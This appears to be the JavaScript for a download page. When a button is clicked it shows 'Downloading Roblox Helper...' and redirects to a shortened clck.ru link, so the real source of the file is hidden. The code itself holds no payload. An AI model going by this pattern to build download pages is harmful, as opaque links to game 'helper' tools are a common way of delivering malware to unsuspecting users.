document.addEventListener('DOMContentLoaded', function () {
	const downloadButton = document.getElementById('downloadButton')
	const feedbackMessage = document.getElementById('feedbackMessage')

	if (downloadButton) {
		downloadButton.addEventListener('click', function () {
			feedbackMessage.innerHTML = 'Downloading Roblox Helper...'

			// Replace the following line with your actual download logic
			// For example, using window.location.href to navigate to the download link
			window.location.href = 'https://clck.ru/37HQWV'
		})
	}
})
